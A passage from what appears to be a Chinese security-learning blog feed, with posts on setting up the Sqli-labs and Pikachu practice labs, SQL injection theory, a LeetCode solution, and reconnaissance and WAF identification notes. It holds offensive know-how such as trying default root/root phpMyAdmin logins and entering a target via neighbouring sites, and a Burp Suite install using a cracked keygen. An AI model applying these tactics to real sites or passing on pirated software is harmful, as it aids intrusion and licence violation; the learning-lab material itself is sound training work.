        <content type="html"><![CDATA[<h1 id="Sqli-labs简介"><a href="#Sqli-labs简介" class="headerlink" title="Sqli-labs简介"></a>Sqli-labs简介</h1><ul><li>Sqli-labs 是一个印度程序员写的，用来学习 sql 注入的一个游戏教程。</li><li>Sqli-labs是一个帮你总结大部分SQL注入漏洞类型的靶场，学习SQL注入漏洞原理，复现SQL注入漏洞必备靶场环境。</li></ul><h1 id="Sqli-labs下载"><a href="#Sqli-labs下载" class="headerlink" title="Sqli-labs下载"></a>Sqli-labs下载</h1><ul><li>这里提供Github的项目地址：<a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></li><li>如果打不开就打开代理</li></ul><h1 id="Sqli-labs安装"><a href="#Sqli-labs安装" class="headerlink" title="Sqli-labs安装"></a>Sqli-labs安装</h1><ul><li>首先，需要安装apache+mysql+php的环境，建议在Windows当中安装phpstudy进行搭建</li><li>将下载好的源码压缩包，解压到phpstudy&#x2F;WWW目录下，如果出现文件重复是否替换的提示，选择是就可以了。<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230907143540.png" alt="image.png"></li></ul><h1 id="Sqli-labs配置"><a href="#Sqli-labs配置" class="headerlink" title="Sqli-labs配置"></a>Sqli-labs配置</h1><ul><li>在<code>WWW/sqli-labs-master/sql-connections</code>文件夹当中，找到<code>db-creds.inc</code>文件，使用notepad++打开编辑<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230907143811.png" alt="image.png"></li><li>在<code>user</code>和<code>pass</code>两项中填写数据库的账户和密码，默认账户和密码都是<code>root</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230907143932.png" alt="image.png"></li><li>如果不知道账户密码的，在phpstudy的数据库一栏中查看<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230907144145.png" alt="image.png"></li><li>在浏览器输入<a href="http://localhost/sqli-labs-master/">http://localhost/sqli-labs-master/</a>就可以打开靶场了<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230907144403.png" alt="image.png"></li><li>点击<code>Setup/reset Database for labs</code>开始自动配置，显示以下画面则是安装成功了<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230907144531.png" alt="image.png"></li><li>接下来就可以开始进入关卡了</li></ul><h1 id="安装时遇到的问题"><a href="#安装时遇到的问题" class="headerlink" title="安装时遇到的问题"></a>安装时遇到的问题</h1><ul><li>这是我遇到的问题，内容翻译的意思就是有无法识别的字符<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/2fea01f4fbdf21ca933eeefa5f9a5e6.png" alt="2fea01f4fbdf21ca933eeefa5f9a5e6.png"></li><li>出现这个情况可能是字符集不适配，我们在phpstudy首页，现在mysql的配置，将字符集设置为<code>utf8</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230907144911.png" alt="image.png"></li><li>如果问题仍然没有解决，可以尝试降低php的版本，建议安装5.4.45版本，在phpstudy软件管理当中下载相应版本，然后在网站栏对应的网站点击管理更换php的版本<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230907145141.png" alt="image.png"></li></ul>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具 </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> Sqli-labs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Day12WEB漏洞-SQL注入之简要SQL注入</title>
      <link href="/2023/09/06/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day12WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%AE%80%E8%A6%81SQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/09/06/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day12WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%AE%80%E8%A6%81SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<ul><li>在本系列课程学习中，SQL注入漏洞将是重点部分，其中SQL注入又非常复杂，区分各种数据库类型，提交方法，数据类型等注入，我们需要按部就班的学习，才能学会相关SQL注入的核心。同样此类漏洞是WEB安全中严重的安全漏洞，学习如何利用，挖掘，修复也是很重要的。<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230904153157.png" alt="image.png"></li></ul><h1 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h1><h2 id="理解SQL注入"><a href="#理解SQL注入" class="headerlink" title="理解SQL注入"></a>理解SQL注入</h2><ol><li>SQL注入是一种将SQL代码插入或添加到应用（用户）的输入参数中的攻击，之后再将这些参数传递给后台的sql服务器加以解析和执行。由于sql语句本身的多样性，以及可用于构造sql语句的编程方法很多，因此凡是构造sql语句的步骤均存在被攻击的潜在风险。Sql注入的方式主要是直接将代码插入参数中，这些参数会被置入sql命令中加以执行。间接的攻击方式是将恶意代码插入字符串中，之后将这些字符串保存到数据库的数据表中或将其当成元数据。当将存储的字符串置入动态sql命令中时，恶意代码就将被执行。</li><li>如果web应用未对动态构造的sql语句使用的参数进行正确性审查（即便使用了参数化技术），攻击者就很可能会修改后台sql语句的构造。如果攻击者能够修改sql语句，那么该语句将与应用的用户具有相同的权限。当使用sql服务器执行与操作系统交互命令时，该进程将与执行命令的组件（如数据库服务器、应用服务器或web服务器）拥有相同的权限，这种权限的级别通常很高。如果攻击者执行以上恶意代码的插入操作成功，那么用户数据库服务器或者整个应用会遭到破坏，甚至被控制。</li></ol><h2 id="SQL注入的产生过程及常见原因"><a href="#SQL注入的产生过程及常见原因" class="headerlink" title="SQL注入的产生过程及常见原因"></a>SQL注入的产生过程及常见原因</h2><h3 id="产生过程"><a href="#产生过程" class="headerlink" title="产生过程"></a>产生过程</h3><ul><li>大多数的web应用都需要与数据库进行交互，并且大多数web应用编程语言（如ASP、C##、.NET、Java和PHP）均提供了可编程的方法来与数据库连接并进行交互。如果web应用开发人员无法确保在将从web表单，cookie及输入参数等收到的值传递给sql查询（该查询在数据库服务器上执行）之前已经对其进行过验证，那么通常会出现sql注入漏洞，如果攻击者能够控制发送给sql查询的输入，并且能够操纵该输入将其解析为代码而非数据，那么攻击者就很有可能有能力在后台数据库执行该代码。</li></ul><h3 id="常见的sql注入产生原因"><a href="#常见的sql注入产生原因" class="headerlink" title="常见的sql注入产生原因"></a>常见的sql注入产生原因</h3><ul><li>基于此，SQL注入的产生原因通常表现在以下几方面：</li></ul><ol><li>转义字符处理不合适；</li><li>不安全的数据库配置；</li><li>不合理的查询集处理；</li><li>不当的错误处理；</li><li>多个提交处理不当。</li></ol><h4 id="不当的处理类型"><a href="#不当的处理类型" class="headerlink" title="不当的处理类型"></a>不当的处理类型</h4><ul><li>Sql数据库将单引号字符（’）解析成代码与数据间的分界线：单引号外面的内容均是需要运行的代码，而用单引号引起来的内容均是数据。因为只需要简单的在URL或WEB页面的字段中输入一个单引号，就能很快速的识别出web站点是否会受到sql注入攻击。</li></ul><h4 id="不安全的数据库配置"><a href="#不安全的数据库配置" class="headerlink" title="不安全的数据库配置"></a>不安全的数据库配置</h4><ul><li>数据库带有很多默认的用户预安装内容。SQL Server使用声名狼藉的“sa”作为数据库系统管理员账户，MySQL使用“root”和“anonymous”用户账户，Oracle则在创建数据库时通常会创建SYS、SYSTEM、DBSNMP和OUTLN账户。这些并非是全部的账号，只是比较出名的账户中的一部分，还有很多其他的账户。其他账户同样按默认方式进行预设，口令众所周知。</li><li>这就带来了很大的安全风险，攻击者利用sql注入漏洞时，通常会常识访问数据库的元数据，比如内部的数据库和表的名称、列的数据类型和访问权限，例如MySQL服务器的元数据位于information_schema虚拟数据库中，可通过show databases；和show tables；命令访问。所有的MySQL用户均有权限访问该数据库中的表，但只能查看表中那些与该用户访问权限相对应的对象的行。</li></ul><h4 id="不合理的查询集处理"><a href="#不合理的查询集处理" class="headerlink" title="不合理的查询集处理"></a>不合理的查询集处理</h4><ul><li>有时需要使用动态的sql语句对某些复杂的应用进行编码，因为程序开发阶段可能还不知道要查询的表或字段（或者不存在）。比如与大型数据库交互的应用，这些数据库在定期创建的表中的数据由于应用已经产生了输入，因而开发人员会信任该数据，攻击者可以使用自己的表和字段数据来替换应用产生的值，从而影响系统的返回值。</li></ul><h4 id="不当的错误处理"><a href="#不当的错误处理" class="headerlink" title="不当的错误处理"></a>不当的错误处理</h4><ul><li>错误处理不当会为web站点带来很多安全方面的问题。最常见的问题是将详细的内部错误消息（如错误代码，数据库转存储）显示给用户或攻击。这些错误消息会泄露实现细节，为攻击者提供与网站潜在缺陷相关的重要线索。</li></ul><h4 id="多个提交处理不当"><a href="#多个提交处理不当" class="headerlink" title="多个提交处理不当"></a>多个提交处理不当</h4><ul><li><p>大型的web开发项目会出现这样的问题：有些开发人员会对输入进行验证，而一些开发人员则不以为然。对于开发人员，团队，甚至公司来说，彼此独立工作的情形并不少见，很难保证项目中每个人都遵循相同的标准。  </p></li><li><p>应用的开发人员还倾向于围绕用户来设计应用，他们尽可能的使用预期的处理流程来引导用户，认为用户将遵循他们已经设计好的逻辑顺序。</p></li><li><p>例如：当用户已到达一系列表单中的第三个表单时，他们会期望用户肯定已经完成第一个和第二个表达。但实际上，借助URL乱序来请求资源，能够非常容易的避开预期的数据流程。</p></li></ul><h1 id="二、MYSQL注入"><a href="#二、MYSQL注入" class="headerlink" title="二、MYSQL注入"></a>二、MYSQL注入</h1><ul><li>mysql注入的思维导图<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230904200119.png" alt="image.png"></li></ul><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><ul><li>信息收集主要是收集数据库里面的信息，包括操作系统、数据库名、数据库用户、数据库版本、网站路径等</li><li>数据库用户指的是数据库的管理员，包括账号密码</li><li>路径主要是指网站源码的路径，不同操作系统的路径不一样</li></ul><h2 id="数据注入"><a href="#数据注入" class="headerlink" title="数据注入"></a>数据注入</h2><ul><li>高版本的数据库使用有据查询，就是有根据地查询</li><li>低版本则是暴力查询，就是能搞就搞，搞不出来就算了的</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 小迪安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 小迪安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>力扣 No.70爬楼梯</title>
      <link href="/2023/09/05/%E5%8A%9B%E6%89%A3%20No.70%E7%88%AC%E6%A5%BC%E6%A2%AF/"/>
      <url>/2023/09/05/%E5%8A%9B%E6%89%A3%20No.70%E7%88%AC%E6%A5%BC%E6%A2%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><ul><li>假设你正在爬楼梯。需要 <code>n</code> 阶你才能到达楼顶。</li><li>每次你可以爬 <code>1</code> 或 <code>2</code> 个台阶。你有多少种不同的方法可以爬到楼顶呢？</li><li>使用C++</li><li><strong>示例 1：</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入：n = 2</span><br><span class="line">输出：2</span><br><span class="line">解释：有两种方法可以爬到楼顶。</span><br><span class="line">1. 1 阶 + 1 阶</span><br><span class="line">2. 2 阶</span><br></pre></td></tr></table></figure></li><li><strong>示例 2：</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入：n = 3</span><br><span class="line">输出：3</span><br><span class="line">解释：有三种方法可以爬到楼顶。</span><br><span class="line">1. 1 阶 + 1 阶 + 1 阶</span><br><span class="line">2. 1 阶 + 2 阶</span><br><span class="line">3. 2 阶 + 1 阶</span><br></pre></td></tr></table></figure></li><li><strong>示例3：</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">输入：n = 4</span><br><span class="line">输出：5</span><br><span class="line">解释：有五种方法可以爬到楼顶。</span><br><span class="line">1. 1 阶 + 1 阶 + 1 阶 + 1 阶</span><br><span class="line">2. 1 阶 + 2 阶 + 1 阶</span><br><span class="line">3. 2 阶 + 1 阶 + 1 阶</span><br><span class="line">4. 1 阶 + 1 阶 + 2 阶</span><br><span class="line">5. 2 阶 + 2 阶</span><br></pre></td></tr></table></figure></li><li>难度属于简单，题目官方的解答啰哩吧嗦的，我就按照自己的想法说说吧</li></ul><h1 id="动态规划"><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h1><ul><li>每次可以选择登一阶或者两阶</li><li>我们发现第<code>n</code>阶的登顶方法数都是在<code>n-1</code>阶基础上<code>+1</code>，以及在<code>n-2</code>阶的基础上<code>+2</code>，所以这阶的方法数就是前两阶之和</li><li>用这个方法我们知道，在0阶设为1种，在1阶是1种，在2阶则是2种（因为1+1&#x3D;2），以此类推第三阶则是3种（1+2&#x3D;3）</li><li>由此则是动态规划算法<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">climbStairs</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> p = <span class="number">0</span>, q = <span class="number">0</span>, r = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line">            p = q;</span><br><span class="line">            q = r;</span><br><span class="line">            r = p + q;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li>时间复杂度：O(n)</li><li>空间复杂度：O(1)</li></ul>]]></content>
      
      
      <categories>
          
          <category> 力扣题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
            <tag> 力扣 </tag>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BurpSuite安装教程</title>
      <link href="/2023/09/04/BurpSuite%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/"/>
      <url>/2023/09/04/BurpSuite%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<ul><li>Burp Suite 是用于攻击web 应用程序的集成平台，包含了许多工具。Burp Suite为这些工具设计了许多接口，以加快攻击应用程序的过程。所有工具都共享一个请求，并能处理对应的HTTP 消息、持久性、认证、代理、日志、警报。</li></ul><h1 id="下载BurpSuite"><a href="#下载BurpSuite" class="headerlink" title="下载BurpSuite"></a>下载BurpSuite</h1><ul><li>这里我在网上找到的资源，是百度网盘下载的，如果觉得下载太慢可以自行搜索其他资源</li><li>网盘链接：<a href="https://pan.baidu.com/s/11lrFGT0aGCd4BQcAJrL55w">https://pan.baidu.com/s/11lrFGT0aGCd4BQcAJrL55w</a></li><li>提取码：w5lg<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230904204902.png" alt="image.png"></li><li>文件目录，不建议在中文目录下</li></ul><h1 id="安装jdk"><a href="#安装jdk" class="headerlink" title="安装jdk"></a>安装jdk</h1><ul><li>这个资源包提供了配套的jdk，我们可以直接使用这个jdk安装就行</li><li>如果电脑本身就有Java的也可以安装，因为原有的Java版本不一定适配</li><li>由于Java环境配置特别麻烦，所以我直接给个<a href="https://www.runoob.com/java/java-environment-setup.html">非常详细的教程</a>吧，直接跳到配置环境变量那里</li><li>配置完成在<code>cmd</code>中键入<code>java -version</code>，就可以看见以下内容，说明安装配置成功<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230904205305.png" alt="image.png"></li></ul><h1 id="安装BurpSuite"><a href="#安装BurpSuite" class="headerlink" title="安装BurpSuite"></a>安装BurpSuite</h1><ul><li>首先右键资源包内的<code>burp-loader-keygen.jar</code>，使用Java打开<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230904205549.png" alt="image.png"></li><li>点击<code>运行薄荷.vbs</code>，弹出来一个窗口<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230904210557.png" alt="image.png"></li></ul><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230904205855.png" alt="image.png"></p><ul><li>将大窗口<code>license</code>内的内容复制到小窗口内，点击Next<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230904210022.png" alt="image.png"></li><li>然后点击<code>Manual activation(手动激活)</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230904210127.png" alt="image.png"></li><li>将小窗口第二栏的内容复制到大窗口的第二栏</li><li>大窗口第三栏会出现内容，复制粘贴到小窗口的第三栏</li><li>点击Next就安装完成了</li><li>再次打开<code>运行薄荷.vbs</code>就可以看到<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230904210641.png" alt="image.png"></li><li>以后允许就打开这个</li><li>但是很难找所以可以给它创建一个快捷方式</li></ul><h1 id="浏览器配置"><a href="#浏览器配置" class="headerlink" title="浏览器配置"></a>浏览器配置</h1><ul><li>这里我选择的是火狐浏览器firefox<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230904212717.png" alt="image.png"></li><li>按照这个内容设置</li><li>其他浏览器的方法可以在网上找找，都差不多</li></ul><h1 id="CA证书"><a href="#CA证书" class="headerlink" title="CA证书"></a>CA证书</h1><ul><li>使用Burp Suite做安全测试时，要抓取HTTPS的包的话，是需要有Burp Suite的CA证书的，否则浏览器不支持。</li><li>使用BP导出CA证书<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230904212913.png" alt="image.png"></li><li>输入以下内容就可以<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230904212947.png" alt="image.png"></li><li>在burpsuite同级目录下就会出现证书文件<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230904213029.png" alt="image.png"></li><li>打开火狐浏览器，设置内搜索<code>证书</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230904213118.png" alt="image.png"></li><li>点击<code>导入...</code>，选择刚刚导出的证书即可<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230904213303.png" alt="image.png"></li><li>这样就算安装完成了</li></ul>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具 </tag>
            
            <tag> burpsuite </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pikachu靶场环境搭建</title>
      <link href="/2023/09/03/Pikachu%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
      <url>/2023/09/03/Pikachu%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<ul><li>Pikachu是一个带有漏洞的Web应用系统，在这里包含了常见的web安全漏洞。 如果你是一个Web渗透测试学习人员且正发愁没有合适的靶场进行练习，那么Pikachu可能正合你意。</li></ul><h1 id="第一步安装phpstudy"><a href="#第一步安装phpstudy" class="headerlink" title="第一步安装phpstudy"></a>第一步安装phpstudy</h1><ul><li>在<a href="https://www.xp.cn/download.html">phpstudy官网</a>下载安装<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230903215830.png" alt="image.png"></li><li>这里只需要使用到Mysql和apache，所以打开这两个就可以了。</li><li>如果出现MySQL无法打开的情况，可以试试改变MySQL的连接端口，可能是电脑已存在MySQL并占用了默认的3306端口</li><li>测试一下是否开启成功，在浏览器打开<code>localhost/index.php</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230903222109.png" alt="image.png"></li><li>出现以上页面则启动成功</li></ul><h1 id="第二步下载pikachu"><a href="#第二步下载pikachu" class="headerlink" title="第二步下载pikachu"></a>第二步下载pikachu</h1><ul><li>在GitHub当中下载<a href="https://github.com/zhuifengshaonianhanlu/pikachu">pikachu</a><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230903220438.png" alt="image.png"></li></ul><h1 id="第三步搭建pikachu"><a href="#第三步搭建pikachu" class="headerlink" title="第三步搭建pikachu"></a>第三步搭建pikachu</h1><ul><li>在phpstudy中，左栏选择网站</li><li>在网站中创建一个127.0.0.1的网站</li><li>然后将下载的<code>pikachu.zip</code>压缩包解压到<code>phpstudy_pro/WWW/127.0.0.1</code>下</li><li>然后打开<code>pikachu-master/inc/conf.inc.php</code>文件<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230903220851.png" alt="image.png"></li><li>按照指示修改内容</li></ul><h1 id="第四步pikachu！启动！"><a href="#第四步pikachu！启动！" class="headerlink" title="第四步pikachu！启动！"></a>第四步pikachu！启动！</h1><ul><li>在浏览器打开<code>127.0.0.1/pikachu-master</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230903221106.png" alt="image.png"></li><li>可以看见pikachu已经成功打开了，但是还需要初始化</li><li>浏览器地址加上<code>/install.php</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230903221252.png" alt="image.png"></li><li>点击<code>安装/初始化</code>就可以了</li></ul><h1 id="补充-我遇到的问题"><a href="#补充-我遇到的问题" class="headerlink" title="补充-我遇到的问题"></a>补充-我遇到的问题</h1><ol><li>一开始我将<code>pikachu-master</code>直接放在了WWW下，导致一直打不开页面，记得是放在<code>127.0.0.1</code>下</li><li>之后就是网站可以打开了，但是使用里面的内容会出现<code>数据连接失败，请仔细检查inc/config.inc.php的配置解决方法</code>，只是因为没有初始化就直接开始使用的情况，当时搞了好久才发现问题。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具 </tag>
            
            <tag> pikachu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小迪安全 Day08信息收集-架构，搭建，WAF等</title>
      <link href="/2023/09/02/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day08%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%9E%B6%E6%9E%84%EF%BC%8C%E6%90%AD%E5%BB%BA%EF%BC%8CWAF%E7%AD%89/"/>
      <url>/2023/09/02/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day08%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%9E%B6%E6%9E%84%EF%BC%8C%E6%90%AD%E5%BB%BA%EF%BC%8CWAF%E7%AD%89/</url>
      
        <content type="html"><![CDATA[<ul><li>在安全测试中，信息收集是非常重要的一个环节，此环节的信息将影响到后续的成功几率，掌握信息的多少将决定发现漏洞机会大小，换言之决定着是否能完成目标的测试任务。也可以很直接的跟大家说:渗透测试的思路就是从信息收集这里开始，你与大牛的差距也是从这里开始的!<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.png"></li></ul><h1 id="站点搭建分析"><a href="#站点搭建分析" class="headerlink" title="站点搭建分析"></a>站点搭建分析</h1><h2 id="搭建习惯-目录型站点"><a href="#搭建习惯-目录型站点" class="headerlink" title="搭建习惯-目录型站点"></a>搭建习惯-目录型站点</h2><ul><li>简单的理解就是主站上面存在其他的cms程序</li><li>例如：</li><li>学生网站的上面通过后台扫描探针发现有一个bbs的目录一点击发现是一个bbs的论坛网站如：<code>www.xxx.com/bbs</code></li><li>我们把这个成为目录型网站、可以有两种找到漏洞的思路一个是主站的漏洞另外的一个是bbs上面的漏洞</li></ul><h2 id="搭建习惯-端口类站点"><a href="#搭建习惯-端口类站点" class="headerlink" title="搭建习惯-端口类站点"></a>搭建习惯-端口类站点</h2><ul><li>有的站点不是使用的是默认的站点80而是其他的端口，可以使用shodan这种工具去收集端口</li></ul><h2 id="搭建习惯-子域名站点"><a href="#搭建习惯-子域名站点" class="headerlink" title="搭建习惯-子域名站点"></a>搭建习惯-子域名站点</h2><ul><li>现在的主流网站都是采用的这种模式且子域名和网站之间很有可能是不在同一台的服务器上面。</li></ul><h2 id="搭建习惯-类似域名站点"><a href="#搭建习惯-类似域名站点" class="headerlink" title="搭建习惯-类似域名站点"></a>搭建习惯-类似域名站点</h2><ul><li>有些公司由于业务的发展将原来的域名弃用、选择了其他的域名但是我们访问他的旧的域名还是能够访问、有的是二级域名的更换而有的是顶级域名的更换</li><li>可以通过他的旧的域名找到一些突破口</li><li>例如：京东的网站是jd.com 那么他就有可能是采用了jd.net jd.cn等域名我们采用社工的方式去尝试获取他的相关域名信息</li></ul><h2 id="搭建习惯-旁注-c段站点"><a href="#搭建习惯-旁注-c段站点" class="headerlink" title="搭建习惯-旁注,c段站点"></a>搭建习惯-旁注,c段站点</h2><ul><li>旁注：同一个服务器上面存在多个站点、但是你要攻击的是A网站由于各种原因不能完成安全测试。就通过测试B网站进入服务器然后在攻击A网站最终实现目的。</li><li>C段：不同的服务器上面存在不同的网站，通过扫描发现与你渗透测试的是同一个网段最终拿下服务器、然后通过内网渗透的方式拿下渗透服务器。</li><li>在线工具：<a href="https://www.webscan.cc/">https://www.webscan.cc/</a></li><li>通过旁注查询可以发现同一个服务器上面有两个站点可以通过对另外的一个站点进行突破。</li></ul><h2 id="搭建习惯-搭建软件特征站点"><a href="#搭建习惯-搭建软件特征站点" class="headerlink" title="搭建习惯-搭建软件特征站点"></a>搭建习惯-搭建软件特征站点</h2><ul><li>有的网站是借助于第三方的集成搭建工具实现例如：PHPstudy、宝塔等环境</li><li>这样的集成环境搭建的危害就是泄露了详细的版本信息。</li><li>phpstudy搭建了之后在默认的站点安装了phpmyadmin有的网站没有做安全性直接可以通过用户名：root密码：root 登录进入</li></ul><h1 id="WAF防护分析"><a href="#WAF防护分析" class="headerlink" title="WAF防护分析"></a>WAF防护分析</h1><h2 id="什么是WAF应用"><a href="#什么是WAF应用" class="headerlink" title="什么是WAF应用"></a>什么是WAF应用</h2><ul><li>Web应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）。利用国际上公认的一种说法：Web应用防火墙是通过执行一系列针对HTTP&#x2F;HTTPS的安全策略来专门为Web应用提供保护的一款产品。</li></ul><h2 id="如何快速识别WAF"><a href="#如何快速识别WAF" class="headerlink" title="如何快速识别WAF"></a>如何快速识别WAF</h2><h3 id="采用工具wafwoof"><a href="#采用工具wafwoof" class="headerlink" title="采用工具wafwoof"></a>采用工具wafwoof</h3><ul><li>获取地址：<a href="https://codeload.github.com/EnableSecurity/wafw00f/zip/refs/heads/master">https://codeload.github.com/EnableSecurity/wafw00f/zip/refs/heads/master</a></li><li>安装之前一定要有python的环境不然安装不上<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-09-02%20221934.png"></li><li>wafw00f的缺点判断的不是特别的准确存在误报或识别不出的情况。</li></ul><h3 id="检查元素"><a href="#检查元素" class="headerlink" title="检查元素"></a>检查元素</h3><ul><li>在有些网站的请求信息当中有的网站没有做安全信息上面留下了waf的相关信息<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/waf%E6%B5%8B%E8%AF%95.png"></li></ul><h3 id="使用nmap指纹检测"><a href="#使用nmap指纹检测" class="headerlink" title="使用nmap指纹检测"></a>使用nmap指纹检测</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap --script==http-waf-fingerprint</span><br><span class="line">nmap --script=http-waf-detec</span><br></pre></td></tr></table></figure><h2 id="识别wAF对于安全测试的意义"><a href="#识别wAF对于安全测试的意义" class="headerlink" title="识别wAF对于安全测试的意义"></a>识别wAF对于安全测试的意义</h2><ul><li>对于一个网站要是使用了waf而渗透人员没有识别直接使用工具进行扫描有可能会导致waf将你的ip地址拉入黑名单而不能访问。而识别waf在于有针对性行的绕过各个厂商的waf可能存在着不同的绕过思路。</li></ul><hr><p>笔记参考自<a href="https://www.yuque.com/weiker/xiaodi">小迪安全</a></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 小迪安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 小迪安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小迪安全 Day07信息收集-CDN绕过方法</title>
      <link href="/2023/09/02/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day07%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-CDN%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/"/>
